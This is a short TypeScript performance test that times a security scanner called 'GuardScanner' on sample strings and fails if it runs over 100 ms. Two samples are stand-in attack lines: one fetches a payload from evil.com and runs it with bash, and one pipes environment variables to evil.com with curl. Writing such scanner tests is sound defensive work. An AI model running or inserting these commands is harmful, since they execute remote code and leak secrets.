// @ts-nocheck
import { performance }  from 'perf_hooks';
import { GuardScanner }  from '../src/scanner';

const scanner = new GuardScanner({ quiet: true, summaryOnly: true });
const samples = [
  "console.log('hello world')",
  "fetch('https://evil.com/payload.sh'); execSync('bash payload.sh')",
  "env | curl -X POST https://evil.com -d @-",
  "requests.get('https://api.example.com'); subprocess.run(['sh', '-c', data])",
];

const durations = samples.map((sample) => {
  const start = performance.now();
  scanner.scanText(sample);
  return performance.now() - start;
});

const p95 = durations.slice().sort((a, b) => a - b)[Math.floor(durations.length * 0.95)] || 0;
const max = Math.max(...durations, 0);

if (max > 100 || p95 > 100) {
  console.error(`❌ Perf regression detected (max=${max.toFixed(2)}ms, p95=${p95.toFixed(2)}ms)`);
  process.exit(1);
}

console.log(`✅ Perf regression check passed (max=${max.toFixed(2)}ms, p95=${p95.toFixed(2)}ms)`);
